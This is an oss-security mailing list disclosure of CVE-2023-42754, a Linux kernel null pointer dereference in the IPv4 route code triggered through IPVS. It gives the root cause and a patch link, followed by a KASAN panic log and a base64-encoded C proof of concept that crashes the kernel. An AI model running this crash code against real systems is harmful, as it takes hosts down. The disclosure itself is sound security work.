Received: (qmail 30110 invoked by uid 550); 2 Oct 2023 20:07:32 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 20394 invoked from network); 2 Oct 2023 19:54:07 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20230601; t=1696276436; x=1696881236; darn=lists.openwall.com;
        h=to:subject:message-id:date:from:mime-version:from:to:cc:subject
         :date:message-id:reply-to;
        bh=BW1ta0YpU1YCqZNNVbwblNeFHYk5bvMRR4o6y83w0ZQ=;
        b=Y1pZ7pyuDDST7sDEKz7xk2IYluz++7q1KpOqCBfW9FG5upQ00PrFW+Fg6fG7EsUk4P
         7hXTE82FbIXsB6LeA4pte9u4X1pHaQ8MdguE5Xu7eCb6rYxNp+0N5MnEg+Lv4PCvvYY+
         BlQTkq1YU5eurqDQ/bpVXduVI9CJbEN5d6zZzYQfgnPaQyKBsIZv6MnWsqJvIVTlZskn
         /XK2Y9ytohC2nBPUbpwhun8HK2UTDr+45kQCOlpqfTr8t3PYTap9jCHzgZmcihLslIlB
         IIM6WBuHMH1AvpkmTnunrtOOOezdLe0BpBKqWrutM2J6xGCkEEWcY8fwJugy/I5/V549
         pQPA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20230601; t=1696276436; x=1696881236;
        h=to:subject:message-id:date:from:mime-version:x-gm-message-state
         :from:to:cc:subject:date:message-id:reply-to;
        bh=BW1ta0YpU1YCqZNNVbwblNeFHYk5bvMRR4o6y83w0ZQ=;
        b=gpsKpzMHcWtJsiFWW4UEq8IuWCmaB6TGgv9H8HYjYyE5+ooPXxWnyPnmYObJcNnz6S
         3mRvq3xyS9ktVUBo9KVW/8TcUgj9HpPljJJT1ZCljH07i+NgV+obIS/hlzyTuBfT47i0
         K88UvFtX1wkLu0hvI0E00aE1G1hhNnxiVXudJH4Bl4dCZnAMoTPsJAgIHuHspbGOedWF
         hXOGoOIPBavArMo8Sh2cPLVUydck2PAh6RSEW490BmfHu/3CTqUe/dgCxb4R3/jV8qnf
         84zVdqoZs8JSjHcqBNMZthWtBFWHh0PLYag3/LO8+pts+4QnnRbn0waBnIw6eg/XCa3B
         BTfg==
X-Gm-Message-State: AOJu0YzvX+THOQf9oceJ9ytmpwVQTo9gAsj77O9Jx3tcj84/aZCWH8FR
	TLgesAMSqL4Hq0Cu1MOd6CQ5zmqyVYsmaan08IzwKn/Iz1g=
X-Google-Smtp-Source: AGHT+IE5t8LKOoy2jzvH4S9A+b1XuuNPCe2V0h2QAE0mnDbu2E2Kgp7Llr0BzcGUMk3RK/tgVJEm0fTc+b4OdgfatTM=
X-Received: by 2002:a17:906:109e:b0:9a6:572f:597f with SMTP id
 u30-20020a170906109e00b009a6572f597fmr10043086eju.38.1696276435927; Mon, 02
 Oct 2023 12:53:55 -0700 (PDT)
MIME-Version: 1.0
From: Kyle Zeng <zengyhkyle@gmail.com>
Date: Mon, 2 Oct 2023 12:53:20 -0700
Message-ID: <CADW8OBs19JEt7NekWaCuwQh=b90Kt1gDeXApuRXJX7YU0vmBKQ@mail.gmail.com>
To: oss-security@lists.openwall.com
Content-Type: multipart/mixed; boundary="00000000000067a44e0606c12256"
Subject: [oss-security] [CVE-2023-42754] null pointer dereference in Linux kernel ipv4 stack

--00000000000067a44e0606c12256
Content-Type: text/plain; charset="UTF-8"

Hi there,

I recently found a null pointer dereference in Linux kernel that
affects at least upstream and v6.2.16 and v6.1.y, more versions may be affected.

[Root Cause]
The bug is in "ipv4_send_dest_unreach" function in net/ipv4/route.c.
~~~
static void ipv4_send_dest_unreach(struct sk_buff *skb)
{
        ...
        res = __ip_options_compile(dev_net(skb->dev), &opt, skb, NULL);
        ...
}
~~~
As shown above, this function assumes there is always a device
associated with a sk_buff, which is not always the case. For exmaple,
when the skb is rerouted through ipvs, its skb->dev is NULL. Then the
following `dev_net` call, which accesses `dev->nd_net`, becomes null
pointer dereference.

[Patch]
I have contacted Linux kernel team and prepared a patch for this bug:
https://git.kernel.org/pub/scm/linux/kernel/git/netdev/net.git/commit/?id=0113d9c9d1cc
Currently, the patch is merged into upstream and added to the stable-queue.
The patch is queued up for v6.5, v6.1, v5.15, v5.10, v5.4, v4.19, v4.14.

A proof-of-concept crash code is attached to this email..

Best,
Kyle Zeng

===================================================================
[    6.289675] general protection fault, probably for non-canonical
address 0xdffffc0000000096: 0000 [#1] PREEMPT SMP KASAN NOPTI
[    6.292146] KASAN: null-ptr-deref in range
[0x00000000000004b0-0x00000000000004b7]
[    6.293823] CPU: 0 PID: 509 Comm: poc Not tainted 6.1.47+ #59
[    6.294699] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996),
BIOS 1.15.0-1 04/01/2014
[    6.295151] RIP: 0010:ipv4_link_failure+0x2dc/0x610
[    6.295423] Code: 80 3c 28 00 48 89 e9 74 12 4c 89 f7 e8 5d e8 bd
fd 48 b9 00 00 00 00 00 fc ff df bd b0 04 00 00 49 03 2e 48 89 e8 48
c1 e8 03 <80> 3c 08 00 74 08 48 89 ef e8 36 e8 bd fd 48 8b 7d 00 48 8d
74 24
[    6.296423] RSP: 0018:ffff88800bc87530 EFLAGS: 00010206
[    6.296710] RAX: 0000000000000096 RBX: ffff88800af22c04 RCX: dffffc0000000000
[    6.297096] RDX: dffffc0000000000 RSI: 00000000fffffff8 RDI: ffff88800bc87578
[    6.297482] RBP: 00000000000004b0 R08: dffffc0000000000 R09: ffff88800bc87570
[    6.297868] R10: dfffe91001790eb1 R11: 1ffff11001790eae R12: ffff88800af22b40
[    6.298282] R13: 1ffff110015e4576 R14: ffff88800af22b50 R15: 1ffff110015e4576
[    6.298679] FS:  00000000032493c0(0000) GS:ffff888034e00000(0000)
knlGS:0000000000000000
[    6.299123] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[    6.299442] CR2: 0000000000404dfe CR3: 000000000d492004 CR4: 0000000000770ef0
[    6.299841] PKRU: 55555554
[    6.299995] Call Trace:
[    6.300137]  <TASK>
[    6.300259]  ? __die_body+0x67/0xb0
[    6.300455]  ? die_addr+0xb2/0xe0
[    6.300641]  ? exc_general_protection+0x27f/0x3c0
[    6.300902]  ? asm_exc_general_protection+0x22/0x30
[    6.301167]  ? ipv4_link_failure+0x2dc/0x610
[    6.301398]  __ip_vs_get_out_rt+0x54a/0x1060
[    6.301629]  ? kasan_save_free_info+0x27/0x40
[    6.301871]  ip_vs_nat_xmit+0x144/0x800
[    6.302114]  ? ip_vs_in_stats+0x1ca/0x2d0
[    6.302334]  ip_vs_in_hook+0xc13/0x1b20
[    6.302546]  ? ip_vs_out_hook+0xd70/0xd70
[    6.302767]  nf_hook_slow+0xb4/0x190
[    6.302963]  __ip_local_out+0x347/0x450
[    6.303171]  ? __ip_local_out+0x450/0x450
[    6.303387]  ip_send_skb+0x48/0x110
[    6.303589]  udp_send_skb+0x6e4/0x1370
[    6.303805]  udp_sendmsg+0x16ba/0x2850
[    6.304016]  ? ip_skb_dst_mtu+0x5e0/0x5e0
[    6.304250]  ? inet_send_prepare+0x2f0/0x2f0
[    6.304492]  ____sys_sendmsg+0x560/0x6d0
[    6.304726]  __sys_sendmsg+0x1bd/0x240
[    6.304959]  do_syscall_64+0x67/0x90
[    6.305165]  ? exit_to_user_mode_prepare+0x12/0xa0
[    6.305429]  ? syscall_exit_to_user_mode+0x28/0x150
[    6.305701]  ? do_syscall_64+0x75/0x90
[    6.305915]  ? exit_to_user_mode_prepare+0x12/0xa0
[    6.306199]  entry_SYSCALL_64_after_hwframe+0x63/0xcd
[    6.306485] RIP: 0033:0x474087
[    6.306690] Code: ff ff f7 d8 64 89 02 b8 ff ff ff ff eb b8 0f 1f
44 00 00 f3 0f 1e fa 64 8b 04 25 18 00 00 00 85 c0 75 10 b8 2e 00 00
00 0f 05 <48> 3d 00 f0 ff ff 77 51 c3 48 83 ec 28 89 54 24 1c 48 89 74
24 10
[    6.308329] RSP: 002b:00007ffe8e9dce28 EFLAGS: 00000246 ORIG_RAX:
000000000000002e
[    6.308792] RAX: ffffffffffffffda RBX: 00007ffe8e9dd0a8 RCX: 0000000000474087
[    6.309199] RDX: 0000000000000000 RSI: 00007ffe8e9dce40 RDI: 0000000000000006
[    6.309629] RBP: 00007ffe8e9dcea0 R08: 0000000000000004 R09: 000000000324b480
[    6.310071] R10: 00007ffe8e9dce30 R11: 0000000000000246 R12: 0000000000000001
[    6.310451] R13: 00007ffe8e9dd098 R14: 00000000004fd740 R15: 0000000000000002
[    6.310869]  </TASK>
[    6.311002] Modules linked in:
[    6.311222] ---[ end trace 0000000000000000 ]---
[    6.311493] RIP: 0010:ipv4_link_failure+0x2dc/0x610
[    6.311807] Code: 80 3c 28 00 48 89 e9 74 12 4c 89 f7 e8 5d e8 bd
fd 48 b9 00 00 00 00 00 fc ff df bd b0 04 00 00 49 03 2e 48 89 e8 48
c1 e8 03 <80> 3c 08 00 74 08 48 89 ef e8 36 e8 bd fd 48 8b 7d 00 48 8d
74 24
[    6.312941] RSP: 0018:ffff88800bc87530 EFLAGS: 00010206
[    6.313283] RAX: 0000000000000096 RBX: ffff88800af22c04 RCX: dffffc0000000000
[    6.313766] RDX: dffffc0000000000 RSI: 00000000fffffff8 RDI: ffff88800bc87578
[    6.314248] RBP: 00000000000004b0 R08: dffffc0000000000 R09: ffff88800bc87570
[    6.314676] R10: dfffe91001790eb1 R11: 1ffff11001790eae R12: ffff88800af22b40
[    6.315138] R13: 1ffff110015e4576 R14: ffff88800af22b50 R15: 1ffff110015e4576
[    6.315591] FS:  00000000032493c0(0000) GS:ffff888034e00000(0000)
knlGS:0000000000000000
[    6.316130] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[    6.316501] CR2: 0000000000404dfe CR3: 000000000d492004 CR4: 0000000000770ef0
[    6.316979] PKRU: 55555554
[    6.317146] Kernel panic - not syncing: Fatal exception
[    6.317688] Kernel Offset: disabled
[    6.317910] Rebooting in 1000 seconds..

--00000000000067a44e0606c12256
Content-Type: text/x-csrc; charset="US-ASCII"; name="poc.c"
Content-Disposition: attachment; filename="poc.c"
Content-Transfer-Encoding: base64
Content-ID: <f_ln9b5t5k0>
X-Attachment-Id: f_ln9b5t5k0

I2RlZmluZSBfR05VX1NPVVJDRSANCg0KI2luY2x1ZGUgPHN0ZGludC5oPg0K
I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3RkbGliLmg+DQojaW5j
bHVkZSA8c3RyaW5nLmg+DQojaW5jbHVkZSA8c3lzL3N5c2NhbGwuaD4NCg0K
I2luY2x1ZGUgPGFycGEvaW5ldC5oPg0KI2luY2x1ZGUgPGxpbnV4L2lwX3Zz
Lmg+DQoNCiNkZWZpbmUgTUFSSyAweDQxNDE0MTQxDQoNCnN0cnVjdCBpcF92
c19zdmNkZXN0X3VzZXIgew0KCXN0cnVjdCBpcF92c19zZXJ2aWNlX3VzZXIJ
czsNCglzdHJ1Y3QgaXBfdnNfZGVzdF91c2VyCQlkOw0KfTsNCg0KDQoNCnZv
aWQgc2V0dXBfaXB2cygpDQp7DQoJaW50IHNvY2sgPSBzb2NrZXQoQUZfSU5F
VCwgU09DS19SQVcsIElQUFJPVE9fSUNNUCk7DQoNCglzdHJ1Y3QgaXBfdnNf
c2VydmljZV91c2VyIHN1ID0gew0KCQkucHJvdG9jb2wgPSBJUFBST1RPX1VE
UCwgLy8ganVzdCBhIHZhbGlkIHByb3RvY29sDQoJCS5hZGRyID0gaHRvYmUz
MigwKSwNCgkJLnBvcnQgPSAwLA0KCQkuZndtYXJrID0gTUFSSywgLy8gYWRk
cixwb3J0IGRvbid0IG1hdHRlciBiZWNhdXNlIHdlIGhhdmUgYSBtYXJrIGhl
cmUNCgkJLnNjaGVkX25hbWUgPSAiZGgiLA0KCQkuZmxhZ3MgPSAwLA0KCQku
dGltZW91dCA9IDAsDQoJCS5uZXRtYXNrID0gMA0KCX07DQoNCglzZXRzb2Nr
b3B0KHNvY2ssIFNPTF9JUCwgSVBfVlNfU09fU0VUX0FERCwgJnN1LCBzaXpl
b2Yoc3UpKTsNCg0KDQoJc3RydWN0IGlwX3ZzX3NlcnZpY2VfdXNlciBzdTIg
PSB7DQoJCS5wcm90b2NvbCA9IElQUFJPVE9fVURQLCAvLyBqdXN0IGEgdmFs
aWQgcHJvdG9jb2wNCgkJLmFkZHIgPSBodG9iZTMyKDApLA0KCQkucG9ydCA9
IGh0b2JlMTYoMCksDQoJCS5md21hcmsgPSBNQVJLLCAvLyBhZGRyLHBvcnQg
ZG9uJ3QgbWF0dGVyIGJlY2F1c2Ugd2UgaGF2ZSBhIG1hcmsgaGVyZQ0KCQku
c2NoZWRfbmFtZSA9ICJkaCIsDQoJCS5mbGFncyA9IDAsDQoJCS50aW1lb3V0
ID0gMCwNCgkJLm5ldG1hc2sgPSAwDQoJfTsNCg0KCXN0cnVjdCBpcF92c19k
ZXN0X3VzZXIgZHUgPSB7DQoJCS5hZGRyID0gaHRvYmUzMigweGEwMTAxMDEp
LCAvLyAxNjAuMTYuMTYuMSwganVzdCBhbiBpbnZhbGlkICBhZGRyZXNzDQoJ
CS5wb3J0ID0gaHRvYmUxNigwKSwNCgkJLmNvbm5fZmxhZ3MgPSAwLA0KCQku
d2VpZ2h0ID0gMSwNCgkJLnVfdGhyZXNob2xkID0gLTEsDQoJCS5sX3RocmVz
aG9sZCA9IDB4ODAwDQoJfTsNCg0KCXN0cnVjdCBpcF92c19zdmNkZXN0X3Vz
ZXIgYXJnID0gew0KCQkucyA9IHN1MiwNCgkJLmQgPSBkdQ0KCX07DQoNCglz
ZXRzb2Nrb3B0KHNvY2ssIFNPTF9JUCwgSVBfVlNfU09fU0VUX0FERERFU1Qs
ICZhcmcsIHNpemVvZihhcmcpKTsNCn0NCg0Kdm9pZCBzZW5kX3BrdCh2b2lk
KQ0Kew0KCWludCBzb2NrID0gc29ja2V0KEFGX0lORVQsIFNPQ0tfREdSQU0s
IElQUFJPVE9fSVApOw0KDQoJc3RydWN0IHNvY2thZGRyX2luIHNhOw0KCXNh
LnNpbl9mYW1pbHkgPSBBRl9JTkVUOw0KICAgIHNhLnNpbl9wb3J0ID0gaHRv
bnMoMCk7DQogICAgaW5ldF9wdG9uKEFGX0lORVQsICIxMjcuMC4wLjEiLCAm
KHNhLnNpbl9hZGRyKSk7DQoNCgliaW5kKHNvY2ssICZzYSwgc2l6ZW9mKHNh
KSk7DQoNCgljb25uZWN0KHNvY2ssICZzYSwgc2l6ZW9mKHNhKSk7DQoNCgkv
LyBtYXJrIG91ciBwYWNrZXRzIHNvIGl0IHdpbGwgZ2V0IHJvdXRlZCB0byB0
aGUgaW52YWxpZCBob3N0DQoJaW50IHZhbCA9IE1BUks7DQoJc2V0c29ja29w
dChzb2NrLCBTT0xfU09DS0VULCBTT19NQVJLLCAmdmFsLCBzaXplb2YodmFs
KSk7DQoNCg0KCS8vIGJhc2ljYWxseSBzZW5kaW5nIGFuIGVtcHR5IGNvbnRy
b2wgbWVzc2FnZQ0KCS8vIGFsbCB0aGlzIG1lc3NhZ2UgY29udGFpbnMgaXMg
YSBieXRlIG9mIElQT1BUX0VORA0KCXN0cnVjdCBjbXNnaGRyICpjbXNnaGRy
ID0gY2FsbG9jKHNpemVvZihzdHJ1Y3QgY21zZ2hkcikrMSwgMSk7DQoJY21z
Z2hkci0+Y21zZ19sZW4gPSAweDExOyAvLw0KCWNtc2doZHItPmNtc2dfbGV2
ZWwgPSBTT0xfSVA7IC8vIDANCgljbXNnaGRyLT5jbXNnX3R5cGUgPSBJUF9S
RVRPUFRTOw0KCSooY2hhciAqKWNtc2doZHItPl9fY21zZ19kYXRhID0gMDsN
Cg0KCXN0cnVjdCBtc2doZHIgbXNnaGRyID0gew0KCQkubXNnX25hbWUgPSBO
VUxMLA0KCQkubXNnX25hbWVsZW4gPSAwLA0KCQkubXNnX2lvdiA9IE5VTEws
DQoJCS5tc2dfaW92bGVuID0gMCwNCgkJLm1zZ19jb250cm9sID0gY21zZ2hk
ciwNCgkJLm1zZ19jb250cm9sbGVuID0gY21zZ2hkci0+Y21zZ19sZW4sDQoJ
CS5tc2dfZmxhZ3MgPSAwDQoJfTsNCg0KCXNlbmRtc2coc29jaywgJm1zZ2hk
ciwgMCk7DQp9DQoNCmludCBtYWluKHZvaWQpDQp7DQoJc2V0dXBfaXB2cygp
Ow0KCXNlbmRfcGt0KCk7DQoJcmV0dXJuIDA7DQp9DQo=

--00000000000067a44e0606c12256--
